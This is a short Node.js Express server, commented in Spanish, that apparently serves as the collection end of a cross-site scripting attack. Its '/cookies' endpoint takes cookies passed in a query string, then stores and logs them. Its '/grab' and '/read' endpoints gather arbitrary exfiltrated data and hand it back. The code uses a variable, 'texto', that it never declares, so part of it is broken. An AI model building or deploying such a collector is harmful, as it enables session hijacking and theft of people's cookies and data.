const express = require('express');
const bodyParser = require('body-parser');

const app = express();
let cookiesAlmacenadas = ""; // Variable para almacenar las cookies

app.use(bodyParser.json());

app.get('/', (req, res) => {
    res.send('Página principal: siuuu');
});


app.get('/grab', (req, res) => {
  const data = req.query.data
  texto += " " + data
  res.send(data)
})
app.get('/read', (req, res) => {
  res.send(texto)
})

app.get('/cookies', (req, res) => {
    const cookies = req.query.cookies; // Obtener las cookies 
    cookiesAlmacenadas = cookies; // Almacenar las cookies
    console.log('Cookies recibidas:', cookies); 
    res.send('Cookies recibidas correctamente'); 
});


app.listen(3000, () => {
    console.log('Servidor funcionando en el puerto 3000');
});
